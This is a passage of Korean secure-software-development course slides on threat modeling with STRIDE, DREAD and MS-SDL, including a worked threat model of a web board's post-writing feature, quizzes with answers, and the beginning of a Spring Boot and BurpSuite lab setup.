| **D**amage | 5 | 비밀번호 유출 시 계정 탈취 가능하지만 전체 시스템은 영향 없음 |
| **R**eproducibility | 10 | 누구나 여러 번 시도하여 쉽게 비밀번호를 크랙할 수 있음 |
| **E**xploitability | 10 | 간단한 스크립트 또는 도구로 공격 가능 |
| **A**ffected Users | 8 | 많은 사용자가 영향을 받을 가능성이 있음 |
| **D**iscoverability | 10 | 자동화된 도구(Brute-force 공격)로 쉽게 탐지 가능 |
| **총점** | **42 (Critical)** | 긴급 패치 필요 (MFA 적용, 복잡한 패스워드 요구) |

---

## [2-SLIDES] 2주차 2차시 p.18 · 위협모델링 개요
위협모델링 개요
01 위협모델링 개요
02 위협모델링 프로세스

---

## [2-SLIDES] 2주차 2차시 p.19 · 위협모델링 프레임워크 프로세스
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
위협모델링 프레임워크 프로세스

[순환 도식: **Diagram**(파랑) → **Identify Threats**(노랑) → **Mitigate**(초록) → **Validate**(주황) → 다시 Diagram (가운데 캡션 '위협모델링 프로세스')]

1. **시스템 정의(Define the System)** — 위협 모델링을 수행하기 위해 보호할 대상(애플리케이션, 데이터, 시스템 등)을 명확히 정의
2. **위협 식별(Identify Threats)** — STRIDE 기법을 사용하여 시스템에서 발생할 수 있는 잠재적인 위협을 식별
3. **완화 계획 수립(Mitigate Threats)** — 식별된 위협을 해결하기 위해 보안 조치를 설계하고 구현
4. **검토 및 개선(Validate & Review)** — 위협모델링 결과를 검토하고 지속적으로 개선하여 보안성을 강화

---

## [2-SLIDES] 2주차 2차시 p.20 · 위협모델링 프로세스 – 시스템 정의(Define the System)
위협모델링 프로세스 – 시스템 정의(Define the System)
목표: 위협 모델링을 수행하기 위해 보호할 대상(애플리케이션, 데이터, 시스템 등)을
Diagram
명확히 정의
주요 활동:
- 시스템의 아키텍처 및 구성 요소 파악
- 데이터 흐름 다이어그램(DFD) 작성
- 신뢰 경계(Trust Boundaries) 설정
- 보호해야 할 주요 자산(데이터, 기능 등) 식별
활용 기법:
- DFD(Data Flow Diagram): 데이터의 이동 경로를 시각적으로 표현
- 아키텍처 다이어그램: 시스템의 주요 구성 요소와 관계를 도식화

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[왼쪽 파란 **Diagram** 상자 = 4단계 중 1단계(시스템 정의)임을 표시]

---

## [2-SLIDES] 2주차 2차시 p.21 · 위협모델링 프로세스 – 위협 식별(Identify Threats) [Id
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
위협모델링 프로세스 – 위협 식별(Identify Threats) [Identify Threats 단계]

🎯 **목표**: STRIDE 기법을 사용하여 시스템에서 발생할 수 있는 잠재적인 위협을 식별

✅ **주요 활동**
- STRIDE 기반의 위협 시나리오 분석
- 시스템 내 취약점을 공격자의 관점에서 분석
- 위협 목록 작성 및 우선순위 지정

🛠 **활용 기법**

STRIDE 모델(Microsoft) — 위협 유형과 깨지는 보안 속성의 대응

| STRIDE 위협 | → | 해당 보안 위협 |
| --- | --- | --- |
| Spoofing (신원 위조) | → | 인증(Authentication) 위협 |
| Tampering (데이터 변조) | → | 무결성(Integrity) 위협 |
| Repudiation (부인 방지 실패) | → | 감사(Audit) 위협 |
| Information Disclosure (정보 노출) | → | 기밀성(Confidentiality) 위협 |
| Denial of Service (서비스 거부) | → | 가용성(Availability) 위협 |
| Elevation of Privilege (권한 상승) | → | 접근 제어(Access Control) 위협 |

위협 분석 기법
- 공격 트리(Attack Tree) 작성
- 위협 시나리오 및 공격 경로 분석
- OWASP Top 10 및 CVE 취약점 참고

---

## [2-SLIDES] 2주차 2차시 p.22 · 위협모델링 프로세스 – 완화 계획 수립(Mitigate Threats) 
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
위협모델링 프로세스 – 완화 계획 수립(Mitigate Threats) [Mitigate 단계]

🎯 **목표**: 식별된 위협을 해결하기 위해 보안 조치를 설계하고 구현

✅ **주요 활동**
- 위협별 완화 전략 수립 및 적용
- 보안 코딩 원칙 적용
- 접근 제어 강화 및 암호화 적용
- 보안 테스트 계획 수립

🛠 **활용 기법**
- **보안 설계 원칙 적용**: 최소 권한 원칙(Least Privilege) / 보안 강화된 기본 설정(Secure Defaults) / 방어적 코딩(Defensive Coding)
- **보안 기술 적용**: 안전한 인증 및 암호화 기법 적용(예: MFA, AES 암호화) / 입력 검증(Input Validation) 및 보안 필터링 적용 / 보안 로깅 및 감사를 위한 모니터링 도구 활용
- **보안 테스트**: 정적 분석(SAST), 동적 분석(DAST) 도구 적용 / 침투 테스트 수행

---

## [2-SLIDES] 2주차 2차시 p.23 · 위협모델링 프로세스 – 검토 및 개선(Validate & Review)
위협모델링 프로세스 – 검토 및 개선(Validate & Review)
Validate 목표: 위협 모델링 결과를 검토하고, 지속적으로 개선하여 보안성을 강화
주요 활동:
- 위협 모델 검토 및 보안 점검
- 보안 조치의 효과성 검증
- 새롭게 발견된 위협에 대한 업데이트 수행
활용 기법:
보안 검토(Threat Model Review) 수행
- 위협 모델이 최신 시스템 아키텍처를 반영하는지 검토
- 보안 취약점이 해결되었는지 확인
지속적인 개선 및 업데이트
- DevSecOps 환경에서 자동화된 보안 점검 도입
- 최신 위협 정보를 반영하여 보안 정책 업데이트

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[왼쪽 주황 **Validate** 상자 = 4단계 중 4단계(검토 및 개선)임을 표시]

---

## [2-SLIDES] 2주차 2차시 p.24 · MS-SDL 위협모델링 프로세스 요약
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
MS-SDL 위협모델링 프로세스 요약

| 단계 | 주요활동 | 활용기법 |
| --- | --- | --- |
| 1. 시스템 정의 | 보호할 자산 및 데이터 흐름 분석 | DFD, 아키텍처 다이어그램 |
| 2. 위협 식별 | STRIDE 모델을 활용하여 보안 위협 분석 | STRIDE, 공격트리, OWASP TOP 10 |
| 3. 완화 계획 수립 | 위협별 보안 조치 적용 | 최소 권한 원칙, 암호화, 접근제어, 보안코딩 |
| 4. 검토 및 개선 | 보안 검토 및 지속적인 업데이트 수행 | 정적 분석, 동적 분석, 보안 테스트 |

📌 **MS-SDL 위협 모델링의 특징**
- ✅ 개발 초기(설계 단계)에서 보안 위협을 사전에 분석
- ✅ STRIDE 모델을 활용하여 체계적으로 위협을 식별
- ✅ 보안 요구사항을 개발 프로세스에 반영하여 자동화 가능
- ✅ DevSecOps와 연계하여 지속적인 보안 검증 및 개선 가능

MS-SDL의 위협 모델링은 보안이 내재화된 개발 프로세스를 구축하는 데 핵심적인 역할을 한다.

---

## [2-SLIDES] 2주차 2차시 p.25 · 요약 정리
요약 정리
위협모델링은 보안 위협을 사전에 식별하고 대응하기 위한 구조화된 분석 기법이다.
위협모델링은 설계 단계에서 보안을 내재화하고, 공격자의 관점에서 위협을 분석한다.
위협모델링의 핵심 목표는 시스템 이해, 위협 식별, 위험 평가, 보안 조치 적용이다.
다양한 직무의 참여자가 협업하여 위협모델링을 수행하고, 역할에 따라 보안 요구사항을 반영한다.
대표적인 프레임워크로는 STRIDE, DREAD, PASTA, Attack Tree 등이 있다.
MS-SDL 위협모델링을 소프트웨어 개발 생명주기에 통합하여 보안 사고를 예방한다.

---

## [2-SLIDES] 2주차 2차시 p.26 · 참고 문헌
참고 문헌
- [KISA] 소프트웨어 개발 보안 가이드(2021.12.29)
- [KISA] 소프트웨어 보안약점 진단가이드(2021)
- [에이콘출판사] 보안 위협 모델링 Threat Modeling - 위협 식별과 대응을 위한 소프트웨어 설계
- [책만] 모두를 위한 소프트웨어 보안 설계와 구현 - 취약점 분석부터 위협 모델링과 완화 전략, 보안 패턴, 암호화까지 안전한 소프트
웨어의 모든 것
- [WILEY] Threat Modeling: Designing for Security - Adam Shostack
- [OREILLY] Threat Modeling: A Practical Guide for Development Teams - Izar Tarandach, Matthew Coles
- [WILEY] Security Engineering - Ross J. Anderson (Chapter 23 Threat Modeling)
- Threat Modeling manifesto - https://www.threatmodelingmanifesto.org/
- OWASP Threat Modeling Project - https://owasp.org/www-community/Threat_Modeling

---

## [2-SLIDES] 2주차 2차시 p.27 · 감사합니다.
감사합니다.

---

## [2-SLIDES] 2주차 2차시 p.28 · 퀴즈
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
퀴즈

1. 다음 중 위협모델링의 핵심 목표가 아닌 것은?
   1) 위험 평가　2) 보안 조치 적용　3) 시스템 이해　4) SW 구조 이해
2. 다음 중 위협모델링 프로세스 단계에 대한 내용이 틀린 것은?
   1) 시스템 정의 - 구성원간 상호 협업 시스템을 명확히 정의
   2) 위협 식별 - 발생할 수 있는 잠재적 위협을 식별
   3) 완화 계획 수립 - 보안조치를 설계하고 구현
   4) 검토 및 개선 - 결과를 검토하고 지속적으로 개선
3. 다음 중 STRIDE 프레임워크에서 정의한 주요 위협요소에 대한 설명으로 올바른 것은?
   1) 신원 위조 - 사용자가 악의적인 행동을 부인 가능
   2) 권한 상승 - 기밀 데이터가 외부에 노출
   3) 서비스 거부 - 시스템을 사용할 수 없도록 하는 공격
   4) 정보 노출 - 데이터가 불법적으로 변경되거나 조작됨

---

## [2-SLIDES] 2주차 2차시 p.29 · 퀴즈 정답
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
퀴즈 정답

1. **4) SW 구조 이해** — 위협 모델링의 핵심 목표는 시스템 이해, 위협 식별, 위험 평가, 보안 조치 적용입니다.
2. **1) 시스템 정의 - 구성원간 상호 협업 시스템을 명확히 정의** — 시스템 정의 단계에서는 위협 모델링을 수행하기 위해 보호할 대상을 명확히 정의하게 됩니다.
3. **3) 서비스 거부 - 시스템을 사용할 수 없도록 하는 공격** — 서비스 거부 보안 위협은 트래픽 제한, WAF 도입, DDoS 보호 서비스 적용 등으로 대응책을 마련할 수 있습니다.

# [2-SLIDES] 2주차 3차시 — SW개발보안 방법론·위협 모델링
키워드: 보안약점/Weakness/CWE/취약점/Vulnerability · XSS/Cross-Site Scripting/크로스사이트 스크립팅/크로스 사이트 스크립팅/크로스사이트스크립팅/CWE-79 · HTML Encoding/HTML 인코딩/이스케이프/Escape/엔티티/Entity/escapeHtml/textContent · ORM/Object-Relational Mapping/객체 관계 매핑/JPA/Hibernate/하이버네이트 · Authentication/인증/로그인 · Authorization/인가/권한/RBAC/ABAC/PBAC/최소 권한 · Session/세션/JSESSIONID/세션 쿠키/쿠키/HttpOnly/Secure · Token/토큰/Bearer/베어러 · OAuth2/OAuth 2.0/오아스/권한 위임/Authorization Code/인가 코드/PKCE/state · IDOR/Insecure Direct Object References/직접 객체 참조/수평 권한/수직 권한/권한 상승 · Filter/필터/Interceptor/인터셉터/Servlet/DispatcherServlet · Threat Modeling/위협 모델링/STRIDE/스트라이드/DREAD/드레드/MS-SDL/MTMT

## [2-SLIDES] 2주차 3차시 p.1 · 위협모델링 실무 적용
위협모델링 실무 적용
01 위협모델링 도구 활용
02 위협모델링 실무 적용 사례

---

## [2-SLIDES] 2주차 3차시 p.2 · 학습 목표
학습 목표
STRIDE 기반 위협모델링 절차를 이해한다.
MTMT 도구를 사용하여 시스템 위협을 식별한다.
시스템 구성과 데이터 흐름을 시각화 할 수 있다.
위협에 대한 대응 방안을 도출하고 문서화할 수 있다.

---

## [2-SLIDES] 2주차 3차시 p.3 · 학습 내용
학습 내용
1. MTMT 설치 및 모델 생성 방법
2. 시스템 구성요소와 데이터 흐름 다이어그램(DFD) 작성
3. STRIDE 분류체계를 활용한 위협 식별
4. 위협 별 대응 방안 도출 및 보고서 생성
5. 보안 검증 및 로그· 모니터링 기반 개선 방안 수립

---

## [2-SLIDES] 2주차 3차시 p.4 · 위협모델링 실무 적용
위협모델링 실무 적용
01 위협모델링 도구 활용
02 위협모델링 실무 적용 사례

---

## [2-SLIDES] 2주차 3차시 p.5 · 위협모델링 도구 선정 기준
위협모델링 도구 선정 기준
위협 모델링 도구는 자동화, 시각화, 협업 기능, 그리고 보안 프레임워크 지원 여부 등을 고려하여 선택한다.
도구를 선정할 때 고려해야 할 요소
자동화 지원 여부 – 위협 모델을 자동으로 생성하고, 위협을 분석할 수 있는 기능
UI 및 사용 편의성 – 직관적인 인터페이스와 시각화 기능 제공
보안 프레임워크 지원 – STRIDE, PASTA, CVSS 등과 연계 가능 여부
협업 기능 – 여러 팀이 동시에 작업할 수 있는 기능 (DevSecOps 환경 지원 여부)
무료/유료 여부 – 비용 및 라이선스 정책

---

## [2-SLIDES] 2주차 3차시 p.6 · 위협모델링 도구들
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
위협모델링 도구들

| 도구 | 주요 특징 | 지원플랫폼 | 가격 |
| --- | --- | --- | --- |
| Microsoft Threat Modeling Tool | STRIDE 기반, 자동화된 위협 분석, DFD 지원 | Windows | 무료 |
| OWASP Threat Dragon | 웹 기반, 협업 지원, STRIDE 기반 위협 분석 | Windows, Mac, Linux | 무료 |
| IriusRisk | PASTA 기반, 위협 모델링 자동화, 보안 요구사항 생성 | 클라우드, 온프레미스 | 유료 |
| ThreatModeler | DevSecOps 연계, 위협 시뮬레이션, API 연동 | 클라우드, 온프레미스 | 유료 |
| SecuriCAD | 네트워크 모델링 및 공격 시뮬레이션 | 클라우드, 온프레미스 | 유료 |
| CAIRIS | UX 설계 및 보안 분석 통합, CVSS 기반 평가 | Linux, Docker | 무료 |

---

## [2-SLIDES] 2주차 3차시 p.7 · 위협모델링 도구들 – 도구 선정 가이드
위협모델링 도구들 – 도구 선정 가이드
무료 도구가 필요하다면?
- Microsoft Threat Modeling Tool (MS-SDL 기반, STRIDE 분석)
- OWASP Threat Dragon (웹 기반 협업 가능)
- CAIRIS (UX 및 보안 요구사항 통합 가능)
DevSecOps 파이프라인에서 사용하려면?
- ThreatModeler (CI/CD 연계, 클라우드 보안 지원)
- IriusRisk (자동 위협 모델링 및 보안 요구사항 생성)
- OWASP Threat Dragon (GitHub 연동 가능)
네트워크 및 인프라 보안을 강화하려면?
- SecuriCAD (공격 시뮬레이션 및 네트워크 보안 평가)
- ThreatModeler (AWS, Azure 등 클라우드 환경 지원)

---

## [2-SLIDES] 2주차 3차시 p.8 · MTMT(Microsoft Threats Modeling Tool)
MTMT(Microsoft Threats Modeling Tool)
MTMT 설치 및 실습 영상

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[MTMT 실습 영상 캡처: 'Sample Web - Microsoft Threat Modeling Tool' 창]

다이어그램: **Human User** —(HTTPS)→ **Web Server**(원) —(Binary)→ **SQL Database**

아래 Threat List(자동 생성된 위협 목록, "6 Threats Displayed, 6 Total"):

| ID | State | Title | Category | Interaction | Priority |
| --- | --- | --- | --- | --- | --- |
| 0 | Not Started | Spoofing the Human User … | Spoofing | HTTPS | High |
| 1 | Not Started | Cross Site Scripting … | Tampering | HTTPS | High |
| 2 | Not Started | Elevation Using … | Elevation Of Privilege | HTTPS | High |
| 3 | Not Started | Spoofing of De… | Spoofing | Binary | High |

(나머지 2건은 화면 밖. 슬라이드 원본은 동영상 — 영상 내용은 PDF에 포함되지 않음)

---

## [2-SLIDES] 2주차 3차시 p.9 · 위협모델링 실무 적용
위협모델링 실무 적용
01 위협모델링 도구 활용
02 위협모델링 실무 적용 사례

---

## [2-SLIDES] 2주차 3차시 p.10 · 위협모델링 실무 적용 실습
위협모델링 실무 적용 실습
서비스 시스템 전체가 아닌 웹 게시판 기능 일부를 대상으로 하여, 위협모델링 과정을 단계적으로 실습
- 대상 기능: 게시글 작성, 댓글 작성 (개별 실습)
위협모델링 분석 절차
1. 시스템 이해 및 범위 정의
2. STRIDE 위협 도출
3. DREAD 위험도 평가
4. 위협 완화 및 대응 전략 수립
5. 보안 검증 및 지속적인 개선

---

## [2-SLIDES] 2주차 3차시 p.11 · 1단계: 시스템 이해 및 범위 정의
1단계: 시스템 이해 및 범위 정의
게시글 작성 기능으로만 범위를 정하고 이에 대한 시나리오와 관련 구성 요소를 도출한 후 DFD 작성
게시글 작성 시나리오 관련 구성 요소
1. 로그인한 사용자가 게시글 작성 페이지로 이동 · 사용자 (로그인 상태)
2. 제목, 내용, 첨부파일을 입력 · 게시글 작성 요청 처리 서버
3. 작성 버튼 클릭 · 게시글 DB
4. 서버에서 세션 기반 인증 확인 · 파일 저장소
5. 입력 값 검증 수행
6. 게시글 내용을 DB에 저장
7. 첨부파일은 파일 저장소에 저장

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[구성 요소 옆 아이콘: 사용자 = 사람, 서버 = 모니터, 게시글 DB = 데이터베이스, 파일 저장소 = 클라우드 다운로드 — MTMT 스텐실 모양]

---

## [2-SLIDES] 2주차 3차시 p.12 · 1단계: 시스템 이해 및 범위 정의 - DFD 그리기
1단계: 시스템 이해 및 범위 정의 - DFD 그리기
게시글 작성 기능에 대한 DFD

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[DFD: 게시글 작성 기능 (MTMT로 작성)]

```
                  ┆ Internet Boundary (빨간 점선 = 신뢰 경계)
┌──────────┐      ┆   ── 게시글 작성 (HTTPS) ──►   ╭──────────╮ ── 제목/내용 (Binary) ──► ═ 게시글 DB ═
│ 사용자    │      ┆                                │Web Server│
│(로그인한  │ ◄──  ┆  ── 작성 결과 (HTTPS) ───────  ╰──────────╯ ── 첨부 파일 (HTTPS) ──► ═ 파일 저장소 ═
│  상태)    │      ┆
└──────────┘      ┆
```

| 요소 | DFD 기호 | 종류 |
| --- | --- | --- |
| 사용자(로그인한 상태) | 사각형 | External Interactor (외부 개체) |
| Web Server | 원 | Process (프로세스) |
| 게시글 DB, 파일 저장소 | 위아래 평행선 | Data Store (데이터 저장소) |
| 게시글 작성 / 작성 결과 / 제목·내용 / 첨부 파일 | 화살표 | Data Flow (데이터 흐름) |
| Internet Boundary | 빨간 점선 곡선 | Trust Boundary (신뢰 경계) — 사용자와 서버 사이 |

데이터 흐름별 프로토콜: 사용자↔서버 HTTPS, 서버→게시글 DB Binary, 서버→파일 저장소 HTTPS

---

## [2-SLIDES] 2주차 3차시 p.13 · 2단계: STRIDE 위협 도출 — 게시글 작성 기능에 대한 STRIDE
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
2단계: STRIDE 위협 도출 — 게시글 작성 기능에 대한 STRIDE 위협 도출

| STRIDE 요소 | 적용 대상 | 위협 예시 |
| --- | --- | --- |
| Spoofing (신원 위조) | 게시글 작성 API | 로그인하지 않은 사용자가 API를 직접 호출해 게시글 작성 가능 |
| | 세션 쿠키 | 세션 탈취로 타인 계정으로 게시글 작성 |
| Tampering (데이터 변조) | 게시글 입력값 | 게시글 제목 또는 내용에 악성 스크립트를 삽입 가능 |
| | 파일 업로드 경로 | 경로 조작으로 시스템 파일 덮어쓰기 시도 |
| Repudiation (행위 부인) | 로그 기록 | 작성자 정보가 제대로 기록되지 않으면, 작성 사실을 부인할 수 있음 |
| | DB 트랜잭션 | 감사 기록이 저장되지 않아 조작 가능성 있음 |
| Information Disclosure (정보 노출) | 파일 저장소 경로 | 업로드된 첨부파일이 인증 없이 접근 가능한 경로에 저장되면 외부에 노출될 수 있음 |
| | 오류 메시지 | 서버 경로 정보가 노출되어 내부 구조 노출 |
| Denial of Service (서비스 거부) | 게시글 작성 프로세스 | 봇으로 대량의 게시글을 등록하여 서비스 이용을 방해할 수 있음 |
| | 본문 입력 필드 | 과도한 텍스트 입력으로 렌더링 지연 발생 |
| Elevation of Privilege (권한 상승) | 관리자 API | 일반 사용자가 관리자 권한으로 공지사항 게시글을 등록할 수 있음 |
| | 권한 검증 로직 | API 요청에 관리자 플래그 삽입 시 권한 상승 가능 |

(원본 슬라이드 '타인 게정'은 '계정'의 오타로 보여 고쳐 적음)

---

## [2-SLIDES] 2주차 3차시 p.14 · 3단계: DREAD 위험도 평가 — 게시글 작성 기능에서 도출된 위협들에
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
3단계: DREAD 위험도 평가 — 게시글 작성 기능에서 도출된 위협들에 대한 위험도 평가

| STRIDE | 위협 내용 | D | R | E | A | D | 평균 |
| --- | --- | --- | --- | --- | --- | --- | --- |
| S | 비인증 API 호출 | 8 | 9 | 7 | 7 | 8 | **7.8** |
| S | 세션 탈취 후 게시 | 9 | 9 | 6 | 8 | 7 | **7.8** |
| T | XSS 게시 | 7 | 8 | 5 | 6 | 7 | 6.6 |
| T | 파일경로 조작 | 9 | 6 | 6 | 7 | 8 | **7.2** |
| R | 사용자ID 미기록 | 6 | 7 | 4 | 6 | 5 | 5.6 |
| R | 감사 로그 없음 | 7 | 7 | 5 | 6 | 6 | 6.2 |
| I | 첨부파일 노출 | 8 | 9 | 5 | 8 | 7 | **7.4** |
| I | 에러에 경로 노출 | 5 | 5 | 3 | 4 | 6 | 4.6 |
| D | 게시글 폭주 등록 | 7 | 8 | 6 | 9 | 7 | **7.4** |
| D | 긴 본문 처리 지연 | 6 | 7 | 4 | 6 | 5 | 5.6 |
| E | 관리자 API 호출 | 9 | 9 | 6 | 7 | 8 | **7.8** |
| E | 권한 필드 조작 | 8 | 8 | 6 | 7 | 7 | **7.2** |

- 열 머리글: **D**amage (피해 규모) / **R**eproducibility (재현 가능성) / **E**xploitability (공격 가능성) / **A**ffected users (영향 받는 사용자 수) / **D**iscoverability (발견 가능성)
- **평균점수 기준**: 7.0 이상 = 높음, 4.0~6.9 = 중간, 4.0 미만 = 낮음 (굵게 표시한 7개가 '높음')
- ※ 이 실습은 앞 차시의 '총점(0~50)' 기준이 아니라 **5개 항목 평균(0~10)** 으로 평가함

---

## [2-SLIDES] 2주차 3차시 p.15 · 4단계: 위협 완화 및 대응 전략 수립 — 도출된 위협 내용들을 완화할 
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
4단계: 위협 완화 및 대응 전략 수립 — 도출된 위협 내용들을 완화할 수 있는 대응 방안 마련

| STRIDE | 적용 대상 | 위협 내용 | 대응 방안 |
| --- | --- | --- | --- |
| S | 게시글 작성 API | 비인증 API 호출 | 모든 요청에 대해 세션 또는 액세스 토큰 기반 인증 필수 확인 |
| S | 세션 쿠키 | 세션 탈취 후 게시 | 세션에 Secure/HttpOnly 플래그 설정, 만료시간 단축 및 재생성 정책 적용 |
| T | 게시글 입력값 | XSS 게시 | 입력값에 대한 HTML 인코딩 처리, XSS 필터 적용 |
| T | 파일 업로드 경로 | 파일경로 조작 | 업로드 경로 서버 측 생성, 사용자 입력값 경로 직접 사용 금지 |
| R | 로그 기록 | 사용자ID 미기록 | 게시글 등록 시 사용자 ID 및 타임스탬프 강제 로깅 |
| R | DB 트랜잭션 | 감사 로그 없음 | DB 레벨에서 감사 로그 저장 기능 활성화 (INSERT/UPDATE 추적) |
| I | 파일 저장소 경로 | 첨부파일 노출 | 업로드 파일 경로에 접근 제어(ACL) 설정 및 인증 체크 적용 |
| I | 오류 메시지 | 에러에 경로 노출 | 클라이언트에 전달되는 에러 메시지는 최소화, 내부 로그에만 상세 기록 |
| D | 게시글 작성 프로세스 | 게시글 폭주 등록 | CAPTCHA 적용, 요청 속도 제한(Rate Limit), IP 기반 필터링 |
| D | 본문 입력 필드 | 긴 본문 처리 지연 | 입력 글자 수 제한, 입력 값 크기 검증 및 오류 반환 |
| E | 관리자 API | 관리자 API 호출 | 관리자 API 요청 시 별도 관리자 인증 및 권한 확인 로직 분리 적용 |
| E | 권한 검증 로직 | 권한 필드 조작 | 서버 측 권한 검증은 사용자 세션 기준으로만 수행 (입력값 무시) |

---

## [2-SLIDES] 2주차 3차시 p.16 · 5단계: 보안 검증 및 지속적인 개선
5단계: 보안 검증 및 지속적인 개선
- 앞 4단계 과정을 통해 수립된 대응 전략을 실제로 수행하고, 사후 테스트를 통해 검증
- 변경사항이 발생하면 위협모델링 과정이 다시 반복되어야 함
- 로그 및 모니터링 시스템을 구축하여 지속적으로 감시

---

## [2-SLIDES] 2주차 3차시 p.17 · [개별 실습] 댓글 작성 기능 위협모델링 분석 준비
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
[개별 실습] 댓글 작성 기능 위협모델링 분석 준비

🧩 **분석 대상: 댓글 작성 기능**
1. 사용자는 게시글 상세 페이지에서 댓글을 작성
2. 서버로 댓글 내용, 게시글 ID가 함께 전송
3. 서버는 로그인 상태를 확인 후, 게시글 ID의 유효성 검증
4. 댓글 내용은 댓글 DB에 저장

🔧 **구성 요소**
- 사용자 (로그인 상태)
- 댓글 처리 웹 서버
- 게시글 DB (게시글 ID 존재 여부 확인)
- 댓글 DB

📌 **분석 시 주의할 점**
- 게시글 ID를 참조하는 흐름 필요
- 첨부파일은 사용되지 않음
- 사용자 입력 값 처리, DB 저장, 권한 확인 등은 동일

**\* 최종 산출물**
- 시스템 개요서: 분석 대상 기초 내용, DFD
- STRIDE 위협 분석표
- DREAD 위험도 평가표
- 보안 대책 문서: 위협 완화 및 대응 방안 정리

---

## [2-SLIDES] 2주차 3차시 p.18 · 요약 정리
요약 정리
시스템의 보안 위협을 STRIDE 기법을 활용해 식별
MTMT 도구로 모델 작성, 위협 분석, 보고서를 생성
시스템 기능과 데이터 흐름을 DFD로 시각화
위협의 위험도를 고려해 대응 우선순위를 설정
보안 조치 반영 여부를 점검하고, 로그· 모니터링 체계를 검토

---

## [2-SLIDES] 2주차 3차시 p.19 · 참고 문헌
참고 문헌
- [KISA] 소프트웨어 개발 보안 가이드(2021.12.29)
- [KISA] 소프트웨어 보안약점 진단가이드(2021)
- [에이콘출판사] 보안 위협 모델링 Threat Modeling - 위협 식별과 대응을 위한 소프트웨어 설계
- [책만] 모두를 위한 소프트웨어 보안 설계와 구현 - 취약점 분석부터 위협 모델링과 완화 전략, 보안 패턴, 암호화까지
안전한 소프트웨어의 모든 것
- Threat Modeling - https://learn.microsoft.com/ko-kr/azure/security/develop/threat-modeling-tool
- 보안애플리케이션 디자인 - https://learn.microsoft.com/ko-kr/azure/security/develop/secure-design

---

## [2-SLIDES] 2주차 3차시 p.20 · 감사합니다.
감사합니다.

---

## [2-SLIDES] 2주차 3차시 p.21 · 퀴즈
퀴즈
1. 다음 중 위협모델링 도구 선정 기준으로 가장 적합하지 않은 것은?
1) 자동화 지원 여부 2) 보안 프레임워크 지원 여부
3) 무료/유료 여부 4) CWE/CVE 연계 분석 여부
2. 다음 중 데이터 흐름 다이어그램(DFD)의 주요 구성요소가 아닌 것은?
1) Process 2) Data Flow
3) External Interactor 4) Module
3. 다음 중 데이터 흐름 다이어그램(DFD)를 작성하는 단계는?
1) 시스템 이해 및 범위 정의 2) 위협 식별
3) 위협 평가 및 대응 우선 순위 결정 4) 위협 완화 및 대응 전략 수립

---

## [2-SLIDES] 2주차 3차시 p.22 · 퀴즈 정답
퀴즈 정답
1. 다음 중 위협모델링 도구 선정 기준으로 가장 적합하지 않은 것은?
4) CWE/CVE 연계 분석 여부
위협모델링 도구는 소프트웨어 약점 및 취약점 목록과 직접적인 연관을 가질 필요는 없습니다.
2. 다음 중 데이터 흐름 다이어그램(DFD)의 주요 구성요소가 아닌 것은?
4) Module
DFD의 주요 구성 요소는 External Interactor, Process, Data Store, Data Flow 입니다.
3. 다음 중 데이터 흐름 다이어그램(DFD)를 작성하는 단계는?
1) 시스템 이해 및 범위 정의
데이터 흐름을 도식으로 그려보는 것은 전체 시스템의 주요 정보 흐름을 이해하기 위해 이루어집니다.

# [2-SLIDES] 3주차 1차시 — Spring Boot 개발 환경·실습
키워드: 보안약점/Weakness/CWE/취약점/Vulnerability · XSS/Cross-Site Scripting/크로스사이트 스크립팅/크로스 사이트 스크립팅/크로스사이트스크립팅/CWE-79 · ORM/Object-Relational Mapping/객체 관계 매핑/JPA/Hibernate/하이버네이트 · Authentication/인증/로그인 · Authorization/인가/권한/RBAC/ABAC/PBAC/최소 권한 · Session/세션/JSESSIONID/세션 쿠키/쿠키/HttpOnly/Secure · OAuth2/OAuth 2.0/오아스/권한 위임/Authorization Code/인가 코드/PKCE/state · Threat Modeling/위협 모델링/STRIDE/스트라이드/DREAD/드레드/MS-SDL/MTMT · ZAP/OWASP ZAP/Active Scan/Burp/버프스위트/버프 스위트

## [2-SLIDES] 3주차 1차시 p.1 · 실습환경 구축-1
실습환경 구축-1
01 실습환경 구축
02 웹과 HTTP 구조 이해
03 데이터 인코딩

---

## [2-SLIDES] 3주차 1차시 p.2 · 학습 목표
학습 목표
보안 실습 환경의 구조를 이해하고, 로컬에 구축한다.
웹의 구조와 HTTP 통신 방식을 이해한다.
BASE64와 URL 인코딩 및 디코딩 개념을 이해한다.

---

## [2-SLIDES] 3주차 1차시 p.3 · 학습 내용
학습 내용
1. LAB 프로젝트 웹 서비스 구동 방법
2. 웹 서버와 애플리케이션 서버, 데이터베이스 간의 구조 및 요청 흐름 이해
3. HTTP 메시지 구조와 요청 메서드, 응답 코드의 역할
4. BASE64, URL 인코딩 및 디코딩 개념 이해

---

## [2-SLIDES] 3주차 1차시 p.4 · 실습환경 구축-1
실습환경 구축-1
01 실습환경 구축
02 웹과 HTTP 구조 이해
03 데이터 인코딩

---

## [2-SLIDES] 3주차 1차시 p.5 · 실습환경 아키텍처 이해
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
실습환경 아키텍처 이해

[도식: 실습 PC (MS Windows, 192.168.0.10) 안에서의 구성]

```
 ┌─────────────────────┐  ◄── HTTP Request ───  ┌─────────────────┐  ◄── HTTP Request ───  ┌──────────────┐
 │   시큐어코딩랩       │                          │ Local Proxy     │                          │    사용자     │
 │   SpringBoot        │  ─── HTTP Response ──►  │ Server          │  ─── HTTP Response ──►  │ Web Browser  │
 │   + DB (MariaDB)    │                          │ BurpSuite       │                          │              │
 └─────────────────────┘                          └─────────────────┘                          └──────────────┘
